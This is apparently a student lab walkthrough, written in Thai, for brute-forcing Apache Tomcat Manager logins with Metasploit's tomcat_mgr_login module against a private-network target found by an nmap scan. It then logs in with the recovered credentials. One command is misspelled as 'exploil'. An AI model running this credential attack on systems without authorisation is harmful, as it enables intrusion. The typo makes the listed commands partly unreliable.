# Attacking-Apache-Tomcat-with-Metasploit

### Metasploit Framework 

> ซึ่งเป็นเครื่องมือที่ใช้สำหรับการทดสอบเจาะระบบ (penetration testing) และการประเมินความปลอดภัยของระบบเครือข่ายและแอปพลิเคชัน

```
msfconsole
```

![msfconsole](https://github.com/Atiwitch15101/Attacking-Apache-Tomcat-with-Metasploit/assets/159407312/84f6410d-5ee7-47e9-a7ec-54f8332e15a7)

### Nmap Service Version Detection

> Nmap มี Option ที่ใช้ตรวจสอบและคาดเดา service และเวอร์ชั่นของ service นั้นก็คือ -sV ตามด้วย IP หรือ Host ที่เราต้องการ

```
nmap -sV 192.168.19.175
```

![nmap -sV](https://github.com/Atiwitch15101/Attacking-Apache-Tomcat-with-Metasploit/assets/159407312/6f8c730d-a227-44d5-abbf-433092e433af)

### search

> คำสั่ง search ใน Metasploit Framework ช่วยค้นหาโมดูลที่เกี่ยวข้องกับคำสำคัญที่คุณป้อนไป

```
search tomcat
```

![search](https://github.com/Atiwitch15101/Attacking-Apache-Tomcat-with-Metasploit/assets/159407312/ecce85cc-adb6-4131-a129-778651be0599)

### use

>use ใน Metasploit Framework ช่วยให้ผู้ใช้สามารถเลือกและใช้โมดูลที่ต้องการในการทดสอบเจาะระบบได้

```
use auxiliary/scanner/http/tomcat_mgr_login 
```

![use](https://github.com/Atiwitch15101/Attacking-Apache-Tomcat-with-Metasploit/assets/159407312/32920552-4e06-4e91-b3e0-95fccecb9e99)

### show options

>คำสั่ง show options เมื่อใช้ Metasploit Framework ใช้เพื่อแสดงตัวเลือกและพารามิเตอร์ที่สามารถตั้งค่าสำหรับโมดูลที่เลือก ช่วยให้รู้ว่าต้องกำหนดค่าอะไรบ้างก่อนที่จะรันโมดูลนั้น

```
show options
```

![show op1](https://github.com/Atiwitch15101/Tomcat/assets/159407312/f10b8150-1873-449a-937e-97a1fe381181)

### set

>คำสั่ง set เมื่อใช้ Metasploit Framework ใช้เพื่อกำหนดค่าพารามิเตอร์สำหรับโมดูลที่เลือก

> [!NOTE]
> - `BRUTEFORCE_SPEED` ตั้งความเร็วในการ brute force (1-5, ค่า 5 เร็วสุด)
> - `RHOSTS` ระบุเป้าหมายหรือกลุ่มเป้าหมาย (เช่น IP หรือช่วง IP)
> - `STOP_ON_SUCCESS` หยุดการโจมตีเมื่อประสบความสำเร็จ (true/false)
> - `RPORT` ระบุพอร์ตของเป้าหมาย (เช่น 80 สำหรับ HTTP)

```
set BRUTEFORCE_SPEED 8
```

```
set BRUTEFORCE_SPEED 5
```

```
set RHOSTS 192.168.19.175
```

```
set STOP_ON_SUCCESS true
```

```
set RPORT 8180
```
![set](https://github.com/Atiwitch15101/Tomcat/assets/159407312/0c6d6159-8413-4831-9be7-5ee49929a4a4)

### Check show options again

>เพื่อตรวจสอบค่าที่เราเปลี่ยน

```
show options
```

![show op2](https://github.com/Atiwitch15101/Tomcat/assets/159407312/bc29ddb7-bfa9-4ccf-91e2-e14cb5e3aa69)

### exploil

>คำสั่ง exploit เมื่อใช้ Metasploit Framework ใช้เพื่อเริ่มการโจมตีหรือรันโมดูลที่คุณตั้งค่าเรียบร้อยแล้ว

```
exploil
```

![exploil](https://github.com/Atiwitch15101/Tomcat/assets/159407312/eaa4952b-4cf8-4403-ad7c-f3f9a6a7c655)

>รอ Run ให้เสร็จ จะเห็น User และ pass

![exploil end](https://github.com/Atiwitch15101/Tomcat/assets/159407312/f099ee12-9fb7-4dd9-ba13-d0ba4e89b623)

### lohing

>จากนั้นนำ user และ pass ไป login ที่ url เดิม

![loging](https://github.com/Atiwitch15101/Tomcat/assets/159407312/944f1542-41e6-47ac-be77-9d5642a509c8)

### login

![login](https://github.com/Atiwitch15101/Tomcat/assets/159407312/c73bc666-2e37-456d-be83-d49c3c609148)

